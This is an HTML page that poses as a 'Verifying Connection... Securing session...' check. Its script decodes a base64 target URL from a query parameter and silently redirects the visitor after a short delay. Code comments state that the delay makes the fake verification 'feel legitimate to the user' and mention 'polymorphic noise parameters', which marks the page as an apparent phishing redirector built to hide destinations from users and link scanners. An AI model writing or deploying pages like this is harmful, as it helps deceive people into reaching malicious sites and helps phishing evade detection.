<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verifying Connection...</title>
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #ffffff; 
            margin: 0;
            color: #333;
        }
        .loader { 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #3498db; 
            border-radius: 50%; 
            width: 24px; 
            height: 24px; 
            animation: spin 1s linear infinite; 
            margin-bottom: 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .status-text { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status-text">Securing session...</div>

    <script>
        (function() {
            // URLSearchParams ignores the polymorphic noise parameters automatically
            const params = new URLSearchParams(window.location.search);
            let token = params.get('t');
            
            if (token) {
                try {
                    // 1. Convert URL-safe characters back to standard Base64
                    token = token.replace(/-/g, '+').replace(/_/g, '/');
                    
                    // 2. Fix potential padding issues
                    while (token.length % 4) {
                        token += '=';
                    }
                    
                    // 3. Decode
                    const target = atob(token);
                    
                    // 4. Validate and Redirect
                    if (target.startsWith('http')) {
                        // Small delay (300ms) to allow the loader to be visible, 
                        // making the "verification" feel legitimate to the user
                        setTimeout(() => {
                            window.location.replace(target);
                        }, 300);
                    } else {
                        throw new Error("Invalid Protocol");
                    }
                } catch (e) {
                    document.body.innerHTML = "Verification link expired. Please request a new one.";
                }
            } else {
                document.body.innerHTML = "Authentication required.";
            }
        })();
    </script>
</body>
</html>
